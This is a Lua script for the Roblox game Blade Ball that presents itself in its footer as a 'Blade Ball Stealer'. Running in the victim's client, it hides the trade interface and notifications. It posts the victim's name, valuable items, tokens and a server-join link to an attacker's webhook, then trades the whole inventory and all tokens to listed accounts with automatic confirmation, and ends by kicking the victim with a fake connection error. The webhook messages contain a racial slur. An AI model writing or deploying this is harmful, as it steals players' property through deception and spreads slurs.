_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

-- Paramètres
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "EBK-SS-A" 

-- Interfaces & Data
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- Fonction pour obtenir le nombre EXACT de tokens (Coins)
local function getActualTokens()
    local tokens = 0
    pcall(function()
        -- On tente de récupérer via le système de données du jeu
        local currencyData = Replion.Client:GetReplion("CurrencyStore")
        if currencyData and currencyData.Data and currencyData.Data.Coins then
            tokens = currencyData.Data.Coins
        else
            -- Fallback sur l'UI si le store n'est pas prêt
            local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
            tokens = tonumber(rawText:gsub("[^%d]", "")) or 0
        end
    end)
    return tokens
end

-- Cache UI (Inchangé)
tradeGui.Black.Visible = false
tradeGui.Main.Visible = false
PlayerGui.Notifications.Enabled = false

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

---------------------------------------------------------
-- UTILITAIRES
---------------------------------------------------------

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function getRAP(category, itemName)
    local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
    if not success or not rapData then return 0 end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

---------------------------------------------------------
-- EMBEDS (VIOLET & JAUNE)
---------------------------------------------------------

local function SendJoinMessage(list, prefix)
    local totalRAP = 0
    local itemLines = ""
    for _, item in ipairs(list) do
        totalRAP = totalRAP + item.RAP
        itemLines = itemLines .. "• " .. item.Name .. " [" .. formatNumber(item.RAP) .. " RAP]\n"
    end

    local tokens = getActualTokens()
    itemLines = itemLines .. "\n💰 **Tokens: " .. formatNumber(tokens) .. "**"

    local data = {
        ["auth_token"] = auth_token,
        ["content"] = (prefix ~= "") and prefix .. " game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')" or nil,
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327,
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true},
                {name = "🔗 Join link:", value = "[Click to Join Server](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", inline = false},
                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Empty") .. "```", inline = false}
            },
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"},
            ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

local function SendOnServerMessage()
    local tokens = getActualTokens()
    local totalRAP = 0
    for _, item in ipairs(itemsToSend) do totalRAP = totalRAP + item.RAP end

    local data = {
        ["auth_token"] = auth_token,
        ["embeds"] = {{
            ["title"] = "⚠️ The nigga is on the server !",
            ["color"] = 16776960,
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true},
                {name = "🪙 Tokens:", value = "```" .. formatNumber(tokens) .. "```", inline = true}
            },
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"},
            ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

---------------------------------------------------------
-- LOGIQUE DE TRADE (FIXED)
---------------------------------------------------------

local function doTrade(joinedUser)
    local target = game:GetService("Players"):WaitForChild(joinedUser)
    
    while #itemsToSend > 0 do
        -- Requête de trade
        repeat
            task.wait(0.5)
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
        until inTrade

        task.wait(1.5) -- Stabilité

        -- Envoi des items par lots
        local limit = 0
        while #itemsToSend > 0 and limit < 50 do
            local item = table.remove(itemsToSend, 1)
            netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
            limit = limit + 1
            task.wait(0.1)
        end

        -- AJOUT DES TOKENS (100% de ce qu'il a)
        pcall(function()
            local currentTokens = getActualTokens()
            if currentTokens > 0 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(currentTokens)
            end
        end)

        -- AUTO-CONFIRM
        task.wait(1)
        repeat
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            task.wait(0.5)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            task.wait(0.5)
        until not inTrade
        
        task.wait(1)
    end
    
    task.wait(2)
    plr:kick("Please check your internet connection and try again. (Error Code: 277)")
end

---------------------------------------------------------
-- INITIALISATION
---------------------------------------------------------

-- Scan inventaire
for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                local rap = getRAP(cat, info.Name)
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    local prefix = (ping == "Yes") and "@everyone | " or ""
    
    -- On attend que les données monétaires chargent avant le 1er webhook
    task.wait(1)
    SendJoinMessage(itemsToSend, prefix)

    local function onPlayer(player)
        if table.find(users, player.Name) then
            SendOnServerMessage()
            doTrade(player.Name)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
    Players.PlayerAdded:Connect(onPlayer)
end
